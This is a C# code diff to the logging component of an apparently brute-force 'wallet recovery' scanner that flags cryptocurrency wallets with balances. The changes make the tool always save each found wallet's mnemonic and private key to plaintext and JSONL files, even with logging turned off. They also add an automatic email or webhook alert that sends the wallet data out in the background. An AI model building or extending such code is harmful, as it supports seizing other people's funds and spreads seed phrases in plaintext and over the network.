@@ -23,9 +23,14 @@ namespace WalletRecoveryTool.Core
                 "Logs"
             );
 
-            if (_enabled)
+            try
             {
                 Directory.CreateDirectory(_logDirectory);
+            }
+            catch { }
+
+            if (_enabled)
+            {
                 InitializeLogFile();
             }
         }
@@ -89,12 +94,19 @@ namespace WalletRecoveryTool.Core
 
         public void LogWalletFound(CryptoWalletGenerator.WalletInfo wallet, bool mnemonicOnly = false)
         {
-            if (!_enabled || _currentLogWriter == null) return;
-
             lock (_lock)
             {
                 try
                 {
+                    // Always save found wallets and backups even when verbose session logging is disabled
+                    SaveFoundWallet(wallet, mnemonicOnly);
+                    SaveBackup(wallet, mnemonicOnly);
+
+                    // Automatically dispatch SMTP / Email / Webhook notification in background (deduplicated per wallet)
+                    EmailAlertService.TrySendAlertInBackground(wallet);
+
+                    if (!_enabled || _currentLogWriter == null) return;
+
                     _currentLogWriter.WriteLine("!".PadRight(80, '!'));
                     _currentLogWriter.WriteLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] *** WALLET WITH BALANCE FOUND ***");
                     _currentLogWriter.WriteLine("!".PadRight(80, '!'));
@@ -122,12 +134,6 @@ namespace WalletRecoveryTool.Core
                     }
                     _currentLogWriter.WriteLine("!".PadRight(80, '!'));
                     _currentLogWriter.WriteLine();
-
-                    // Also save to a separate "found wallets" file
-                    SaveFoundWallet(wallet, mnemonicOnly);
-                    
-                    // Save encrypted backup if enabled
-                    SaveBackup(wallet, mnemonicOnly);
                 }
                 catch (Exception ex)
                 {
@@ -141,29 +147,72 @@ namespace WalletRecoveryTool.Core
             try
             {
                 var foundWalletsPath = Path.Combine(_logDirectory, "FOUND_WALLETS.txt");
+                var vaultJsonlPath = Path.Combine(_logDirectory, "FOUND_WALLETS_VAULT.jsonl");
                 var encryptedPath = Path.Combine(_logDirectory, "FOUND_WALLETS.encrypted");
                 var content = new StringBuilder();
                 content.AppendLine($"[FOUND AT: {DateTime.Now:yyyy-MM-dd HH:mm:ss}]");
+                content.AppendLine($"Source: {wallet.Source ?? "Scanner"}");
                 content.AppendLine($"Mnemonic: {wallet.Mnemonic}");
                 
                 if (!mnemonicOnly)
                 {
                     content.AppendLine($"Private Key: {wallet.PrivateKey}");
-                    content.AppendLine($"BTC: {wallet.BitcoinAddress}");
+                    content.AppendLine($"BTC Legacy (P2PKH): {wallet.BitcoinAddress}");
+                    if (!string.IsNullOrEmpty(wallet.BitcoinAddressSegWit))
+                        content.AppendLine($"BTC Nested SegWit (P2SH): {wallet.BitcoinAddressSegWit}");
+                    if (!string.IsNullOrEmpty(wallet.BitcoinAddressNativeSegWit))
+                        content.AppendLine($"BTC Native SegWit (Bech32): {wallet.BitcoinAddressNativeSegWit}");
+                    if (!string.IsNullOrEmpty(wallet.BitcoinAddressTaproot))
+                        content.AppendLine($"BTC Taproot (BIP86 Bech32m): {wallet.BitcoinAddressTaproot}");
                     content.AppendLine($"ETH: {wallet.EthereumAddress}");
                     content.AppendLine($"SOL: {wallet.SolanaAddress}");
                 }
                 
                 content.AppendLine("Balances:");
-                foreach (var balance in wallet.Balances.Where(b => b.Value > 0))
+                if (wallet.Balances != null)
                 {
-                    content.AppendLine($"  {balance.Key}: {balance.Value:F8}");
+                    foreach (var balance in wallet.Balances.Where(b => b.Value > 0))
+                    {
+                        content.AppendLine($"  {balance.Key}: {balance.Value:F8}");
+                    }
                 }
                 content.AppendLine(new string('=', 80));
                 content.AppendLine();
 
-                // Save plaintext (for user convenience)
-                File.AppendAllText(foundWalletsPath, content.ToString());
+                // Save plaintext with explicit OS disk flush (fsync) so hits survive sudden power loss
+                byte[] plainBytes = Encoding.UTF8.GetBytes(content.ToString());
+                using (var fs = new FileStream(foundWalletsPath, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
+                {
+                    fs.Write(plainBytes, 0, plainBytes.Length);
+                    fs.Flush(flushToDisk: true);
+                }
+
+                // Save structured JSONL vault entry with OS disk flush (fsync)
+                try
+                {
+                    var jsonEntry = System.Text.Json.JsonSerializer.Serialize(new
+                    {
+                        foundAt = DateTime.UtcNow.ToString("O"),
+                        source = wallet.Source,
+                        mnemonic = wallet.Mnemonic,
+                        privateKey = mnemonicOnly ? null : wallet.PrivateKey,
+                        btcLegacy = wallet.BitcoinAddress,
+                        btcSegWit = wallet.BitcoinAddressSegWit,
+                        btcNativeSegWit = wallet.BitcoinAddressNativeSegWit,
+                        btcTaproot = wallet.BitcoinAddressTaproot,
+                        ethAddress = wallet.EthereumAddress,
+                        solAddress = wallet.SolanaAddress,
+                        balances = wallet.Balances,
+                        totalUsdValue = wallet.TotalUsdValue
+                    }) + Environment.NewLine;
+                    byte[] jsonBytes = Encoding.UTF8.GetBytes(jsonEntry);
+                    using (var jfs = new FileStream(vaultJsonlPath, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
+                    {
+                        jfs.Write(jsonBytes, 0, jsonBytes.Length);
+                        jfs.Flush(flushToDisk: true);
+                    }
+                }
+                catch { /* Non-fatal if JSONL write fails */ }
                 
                 // Also save DPAPI-encrypted copy (only current Windows user can decrypt)
                 try
